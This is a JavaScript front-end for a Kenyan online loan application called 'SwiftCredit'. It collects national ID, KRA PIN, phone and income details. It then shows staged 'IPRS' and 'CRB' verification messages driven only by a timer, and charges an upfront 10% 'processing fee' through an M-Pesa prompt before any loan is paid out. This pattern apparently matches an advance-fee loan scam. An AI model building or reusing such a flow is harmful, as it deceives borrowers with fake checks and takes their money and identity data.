/* SwiftCredit — main.js v5
   All button handlers match index.html v5 exactly */

const API = '';

/* ── state ── */
const S = {
  applicationId: null, refNumber: null,
  firstName: '', lastName: '', phone: '',
  creditScore: 0, maxLoan: 0,
  loanAmount: 10000, tenor: 3,
  monthlyPayment: 0, processingFee: 0,
  transactionId: null,
  pollInterval: null, countdownInterval: null,
};
let currentTenor = 3;

/* ── utils ── */
const $ = id => document.getElementById(id);
const setText = (id, v) => { const e = $(id); if (e) e.textContent = v; };
const fmt = n => Number(n).toLocaleString('en-KE');
const delay = ms => new Promise(r => setTimeout(r, ms));

/* ── toast ── */
let _tt;
function showToast(msg, type) {
  const t = $('toast');
  $('toast-icon').textContent = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';
  $('toast-msg').textContent  = msg;
  t.className = 'toast-box show' + (type === 'success' ? ' t-ok' : type === 'error' ? ' t-err' : '');
  clearTimeout(_tt);
  _tt = setTimeout(() => t.classList.remove('show'), 4500);
}

/* ── page nav ── */
function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const p = $('page-' + id);
  if (p) { p.classList.add('active'); window.scrollTo(0, 0); }
}

/* ── step nav ── */
function showStep(id) {
  document.querySelectorAll('.flow-step').forEach(s => s.classList.remove('active'));
  const s = $(id);
  if (s) { s.classList.add('active'); window.scrollTo(0, 0); }
}

/* ── sidebar progress ── */
function setProgress(n) {
  [1,2,3,4].forEach(i => {
    const step   = $('sb-' + i);
    const circle = $('sc-' + i);
    const line   = $('sl-' + i);
    if (!step || !circle) return;
    step.classList.remove('active','done');
    if (i < n)       { step.classList.add('done');   circle.textContent = '✓'; if (line) line.style.background = '#059669'; }
    else if (i === n){ step.classList.add('active'); circle.textContent = i;   if (line) line.style.background = ''; }
    else             {                               circle.textContent = i;   if (line) line.style.background = ''; }
  });
}

/* ── field errors ── */
function fieldErr(id, show, msg) {
  const e = $('err-' + id);
  const i = $(id);
  if (e) { if (msg) e.textContent = msg; e.classList.toggle('show', show); }
  if (i) i.classList.toggle('has-err', show);
}
function clearErrors() {
  document.querySelectorAll('.ferror').forEach(e => e.classList.remove('show'));
  document.querySelectorAll('.has-err').forEach(i => i.classList.remove('has-err'));
}

/* ══════════════════════════════════════
   STEP 1 — Personal Info
══════════════════════════════════════ */
async function submitPersonalInfo() {
  clearErrors();

  const fName = $('firstName').value.trim();
  const lName = $('lastName').value.trim();
  const idNum = $('idNumber').value.trim();
  const rawPh = $('phoneNumber').value.trim();
  const dob   = $('dob').value;
  const gender= $('gender').value;
  const emp   = $('employment').value;
  const inc   = $('income').value;
  const purp  = $('loanPurpose').value;
  const ok    = $('consent').checked;

  let valid = true;
  if (!fName)                 { fieldErr('firstName', true); valid = false; }
  if (!lName)                 { fieldErr('lastName',  true); valid = false; }
  if (!/^\d{8}$/.test(idNum)) { fieldErr('idNumber',  true); valid = false; }

  const ph = rawPh.replace(/^0/, '').replace(/\s/g, '');
  if (!/^[17]\d{8}$/.test(ph)) { fieldErr('phone', true); valid = false; }

  if (!dob) {
    fieldErr('dob', true, 'Date of birth is required'); valid = false;
  } else {
    const age = Math.floor((Date.now() - new Date(dob)) / (365.25*24*3600*1000));
    if (age < 18) { fieldErr('dob', true, 'You must be at least 18 years old'); valid = false; }
  }

  if (!inc || Number(inc) < 1) { fieldErr('income', true); valid = false; }
  if (!ok)    { showToast('Please accept the terms and conditions', 'error'); return; }
  if (!valid) { showToast('Please fix the highlighted fields above', 'error'); return; }

  const btn = document.querySelector('#step-1 .btn-primary');
  btn.disabled = true; btn.textContent = 'Please wait…';

  try {
    const res  = await fetch(`${API}/api/application/start`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        firstName: fName, lastName: lName, idNumber: idNum,
        kraPin: $('kraPin').value.trim(),
        phone: '0' + ph, dob, gender, employment: emp,
        income: Number(inc), email: $('email').value.trim(), loanPurpose: purp,
      }),
    });
    const data = await res.json();
    if (!res.ok) {
      showToast(data.error || 'Error saving application. Please retry.', 'error');
      btn.disabled = false; btn.textContent = 'Continue to Eligibility Check →'; return;
    }

    S.applicationId = data.applicationId;
    S.refNumber     = data.refNumber;
    S.firstName     = fName; S.lastName = lName; S.phone = ph;

    const pp = $('payPhone'); if (pp) pp.value = ph;

    showPage('apply');
    showStep('step-2');
    setProgress(2);
    runEligibilityCheck();

  } catch {
    showToast('Network error. Check your connection and retry.', 'error');
    btn.disabled = false; btn.textContent = 'Continue to Eligibility Check →';
  }
}

/* ══════════════════════════════════════
   STEP 2 — Eligibility
══════════════════════════════════════ */
const CK_LABELS = [
  'Verifying identity with IPRS…',
  'Running CRB credit bureau check…',
  'Validating Safaricom number…',
  'Analysing M-Pesa activity…',
  'Calculating your risk score…',
];

async function runEligibilityCheck() {
  $('elig-checking').style.display = 'block';
  $('elig-result').style.display   = 'none';

  const ids = ['ci-1','ci-2','ci-3','ci-4','ci-5'];
  let i = 0;

  async function tick() {
    if (i > 0) {
      const prev = $(ids[i-1]);
      prev.classList.remove('running'); prev.classList.add('done');
      prev.querySelector('.ci-dot').textContent = '✓';
    }
    if (i < ids.length) {
      $(ids[i]).classList.add('running');
      setText('ck-status', CK_LABELS[i]);
      i++; await delay(900 + Math.random() * 400); tick();
    } else {
      try {
        const res  = await fetch(`${API}/api/application/eligibility/${S.applicationId}`, { method: 'POST' });
        const data = await res.json();
        if (!res.ok || !data.eligible) showIneligible(data.creditScore || 0);
        else { S.creditScore = data.creditScore; S.maxLoan = data.maxLoan; showEligible(data); }
      } catch { showToast('Eligibility check failed. Please try again.', 'error'); }
    }
  }
  tick();
}

function showEligible(data) {
  $('elig-checking').style.display = 'none';
  $('elig-result').style.display   = 'block';
  setText('m-maxloan', `KES ${fmt(data.maxLoan)}`);
  setText('m-score',   data.creditScore);

  const cap    = Math.min(data.maxLoan, 115000);
  const slider = $('loanSlider');
  if (slider) {
    slider.max   = cap;
    slider.value = Math.min(parseInt(slider.value), cap);
    S.loanAmount = parseInt(slider.value);
    setText('slider-max',    `KES ${fmt(cap)}`);
    setText('loan-display',  fmt(S.loanAmount));
  }
  calcTerms();
}

function showIneligible(score) {
  $('elig-checking').style.display = 'none';
  $('elig-result').style.display   = 'block';
  const head = $('result-head');
  head.className = 'result-card-head fail';
  $('result-icon').textContent  = '❌';
  $('result-title').textContent = 'Not Eligible at This Time';
  $('result-title').className   = 'result-title fail';
  $('result-sub').textContent   = 'Your profile does not currently meet our lending criteria. You may re-apply after 90 days.';
  setText('m-score',   score || '—');
  setText('m-maxloan', '—');
  $('result-metrics').style.opacity = '0.45';
  $('elig-proceed').style.display   = 'none';
}

function goToLoanSelect() {
  showStep('step-3');
  setProgress(3);
  calcTerms();
}

/* ══════════════════════════════════════
   STEP 3 — Loan Selection
══════════════════════════════════════ */
function calcProcessingFee(amount) { return Math.round(amount * 0.10); }

function calcTerms() {
  const amt = S.loanAmount, m = currentTenor, r = 0.12 / 12;
  const monthly = m === 1
    ? amt * (1 + r)
    : amt * (r * Math.pow(1+r, m)) / (Math.pow(1+r, m) - 1);
  const total = monthly * m, interest = total - amt;
  const fee   = calcProcessingFee(amt);

  S.monthlyPayment = Math.round(monthly);
  S.processingFee  = fee;

  setText('ls-monthly',  `KES ${fmt(Math.round(monthly))}`);
  setText('ls-interest', `KES ${fmt(Math.round(interest))}`);
  setText('ls-total',    `KES ${fmt(Math.round(total))}`);
  setText('ls-fee',      `KES ${fmt(fee)}`);
  setText('fee-live',    `KES ${fmt(fee)}`);
}

function onSliderChange() {
  S.loanAmount = parseInt($('loanSlider').value);
  setText('loan-display', fmt(S.loanAmount));
  document.querySelectorAll('.quick-btn').forEach(b => b.classList.remove('active'));
  calcTerms();
}

function pickAmount(amt) {
  const cap    = Math.min(S.maxLoan || 115000, 115000);
  const actual = Math.min(Math.max(amt, 1000), cap);
  const slider = $('loanSlider');
  slider.value = actual; S.loanAmount = actual;
  setText('loan-display', fmt(actual));
  document.querySelectorAll('.quick-btn').forEach(b => {
    const raw = b.textContent.trim().toUpperCase();
    const val = parseInt(raw.replace(/[^\d]/g,'')) * (raw.includes('K') ? 1000 : 1);
    b.classList.toggle('active', val === amt && actual === amt);
  });
  calcTerms();
}

function pickTenor(el, months) {
  document.querySelectorAll('.tenor-btn').forEach(b => b.classList.remove('active'));
  el.classList.add('active');
  currentTenor = months; S.tenor = months;
  calcTerms();
}

async function goToPayment() {
  const btn = document.querySelector('#step-3 .btn-primary');
  btn.disabled = true; btn.textContent = 'Saving selection…';

  try {
    const res  = await fetch(`${API}/api/application/select/${S.applicationId}`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ loanAmount: S.loanAmount, tenor: currentTenor }),
    });
    const data = await res.json();
    if (!res.ok) {
      showToast(data.error || 'Error saving loan selection', 'error');
      btn.disabled = false; btn.textContent = 'Proceed to Payment →'; return;
    }

    S.processingFee  = data.processingFee;
    S.monthlyPayment = data.monthlyPayment;

    setText('ft-amount', `KES ${fmt(S.loanAmount)}`);
    setText('ft-fee',    `KES ${fmt(S.processingFee)}`);
    setText('ft-total',  `KES ${fmt(S.processingFee)}`);
    setText('btn-fee',   fmt(S.processingFee));
    setText('waiting-fee', `KES ${fmt(S.processingFee)}`);

    showStep('step-4');
    setProgress(4);
    btn.disabled = false; btn.textContent = 'Proceed to Payment →';

  } catch {
    showToast('Network error. Please try again.', 'error');
    btn.disabled = false; btn.textContent = 'Proceed to Payment →';
  }
}

/* ══════════════════════════════════════
   STEP 4 — M-Pesa
══════════════════════════════════════ */
function resetToPayInit() {
  const btn = $('stk-btn');
  if (btn) { btn.disabled = false; btn.innerHTML = `📱 Send M-Pesa Prompt — KES <span id="btn-fee">${fmt(S.processingFee)}</span>`; }
  const w = $('pay-waiting'); if (w) w.style.display = 'none';
  const i = $('pay-init');    if (i) i.style.display = 'block';
}

async function doSTKPush() {
  const raw = $('payPhone').value.trim();
  const ph  = raw.replace(/^0/, '').replace(/\s/g, '');
  if (!/^[17]\d{8}$/.test(ph)) { showToast('Enter a valid Safaricom number (07XX or 01XX)', 'error'); return; }

  const btn = $('stk-btn');
  btn.disabled = true; btn.textContent = 'Sending prompt…';

  try {
    const res  = await fetch(`${API}/api/mpesa/pay`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, phone: '0' + ph }),
    });
    const data = await res.json();

    if (!res.ok || !data.transactionId) {
      showToast(data.error || 'Could not send STK push. Please retry.', 'error');
      resetToPayInit(); return;
    }

    S.transactionId = data.transactionId;
    $('pay-init').style.display    = 'none';
    $('pay-waiting').style.display = 'block';
    startCountdown(120);
    startPolling();

  } catch {
    showToast('Network error. Please try again.', 'error');
    resetToPayInit();
  }
}

function startCountdown(secs) {
  clearInterval(S.countdownInterval);
  let s = secs;
  setText('countdown', s);
  S.countdownInterval = setInterval(() => {
    s--; setText('countdown', s);
    if (s <= 0) {
      clearInterval(S.countdownInterval); clearInterval(S.pollInterval);
      showToast('Payment timed out. Please try again.', 'error');
      resetToPayInit();
    }
  }, 1000);
}

function startPolling() {
  clearInterval(S.pollInterval);
  S.pollInterval = setInterval(async () => {
    try {
      const res  = await fetch(`${API}/api/mpesa/status/${S.transactionId}`);
      const data = await res.json();
      if (data.status === 'success') {
        clearInterval(S.pollInterval); clearInterval(S.countdownInterval);
        onPaymentConfirmed(data.mpesaCode);
      } else if (data.status === 'failed') {
        clearInterval(S.pollInterval); clearInterval(S.countdownInterval);
        showToast('Payment failed or cancelled. Please try again.', 'error');
        resetToPayInit();
      }
    } catch { /* network blip — keep polling */ }
  }, 2500);
}

function resendPush() {
  clearInterval(S.pollInterval); clearInterval(S.countdownInterval);
  resetToPayInit();
  showToast('You can now resend the M-Pesa prompt.', 'info');
}

async function onPaymentConfirmed(mpesaCode) {
  $('pay-waiting').style.display   = 'none';
  $('pay-confirmed').style.display = 'block';
  setText('mpesa-code', mpesaCode || 'Confirmed');

  await delay(2800);

  try {
    const res  = await fetch(`${API}/api/application/submit/${S.applicationId}`, { method: 'POST' });
    const data = await res.json();
    if (res.ok) {
      setText('success-ref', data.refNumber || S.refNumber);
      setText('s-amount',    `KES ${fmt(S.loanAmount)}`);
      setText('s-tenor',     `${currentTenor} Month${currentTenor > 1 ? 's' : ''}`);
      setText('s-monthly',   `KES ${fmt(S.monthlyPayment)}`);
      showPage('success');
    } else {
      showToast(data.error || 'Submission error. Please contact support.', 'error');
    }
  } catch {
    showToast('Network error. Call +254 700 000 000.', 'error');
  }
}

/* ── init ── */
calcTerms();
